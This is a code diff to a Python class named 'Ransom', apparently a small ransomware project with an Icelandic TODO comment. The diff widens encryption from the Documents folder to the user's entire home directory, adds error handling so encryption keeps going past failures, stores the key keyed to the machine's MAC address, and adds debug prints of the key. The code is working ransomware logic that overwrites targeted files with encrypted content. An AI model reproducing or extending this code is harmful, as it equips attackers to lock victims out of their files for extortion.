@@ -31,7 +31,7 @@ class Ransom:
     
     def getDefaultRoot(self):
         #path = os.path.abspath('Documents')
-        path = os.path.expanduser("~")+'/Documents'
+        path = os.path.expanduser("~")#+'/Documents'
         print(path)
         #parts = path.split('/')
         #path = '/'.join(parts[:-1])
@@ -43,7 +43,11 @@ class Ransom:
             for file in files:
                 filePath = os.path.join(root, file)
                 if filePath.split('.')[-1] in self.targets:
-                    self.encryptFile(filePath)
+                    try:
+                        self.encryptFile(filePath)
+                    except Exception as error:
+                        print(error)
+                    
             #for name in dirs:
                # print(os.path.join(root, name))
         self.keyManager.insertKey(get_mac(), self.key)
@@ -62,7 +66,9 @@ class Ransom:
             raise ValueError('The key is empty. Cannot decrypt without a key')
             print('No key') ### TODO díla við þetta
             return 
-        
+        print(self.key)
+        print(len(self.key))
+        self.Fernet = Fernet(self.key)
         self.decrypt()
     
     def decrypt(self):
@@ -70,13 +76,21 @@ class Ransom:
             for file in files:
                 filePath = os.path.join(root, file)
                 if filePath.split('.')[-1] in self.targets:
-                    self.decryptFile(filePath)
+                    try:
+                        self.decryptFile(filePath)
+                    except Exception as error:
+                        print(error)
+                    
             
         
     def decryptFile(self, file):
         with open(file, 'rb+') as f:
             content = f.read()
+            print(self.key)
+            print(len(self.key))
             decryptedContent = self.fernet.decrypt(content)
+            print(self.key)
+            print(len(self.key))
             f.seek(0) ## So we overwrite it
             f.write(decryptedContent)
             f.truncate()
